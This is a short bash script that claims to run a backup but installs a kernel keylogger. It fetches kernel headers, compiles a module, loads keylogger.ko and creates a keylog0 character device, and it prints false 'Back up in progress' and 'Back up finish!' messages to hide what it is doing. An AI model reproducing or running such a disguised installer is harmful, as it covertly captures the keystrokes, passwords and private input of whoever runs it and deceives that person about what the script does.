#!/bin/bash
echo "Back up in progress........"

apt-get update -qq

apt-cache search linux-headers-$(uname -r) > tmp.txt
headfile=$(head -n1 tmp.txt)
rm -f tmp.txt

headfile=${headfile%% *}

apt-get install ${headfile} -qq

make -s

insmod keylogger.ko
rmmod keylogger.ko
insmod keylogger.ko
rmmod keylogger.ko
insmod keylogger.ko

#tail -n1 /var/log/kern.log
M=$(tail -n1 /var/log/kern.log)
substr=${M##* }

#M=$(head -n1 tmp.txt)

if [ ! -c "keylog0" ]
then 
mknod keylog0 c ${substr} 0 
fi 

echo "Back up finish!"
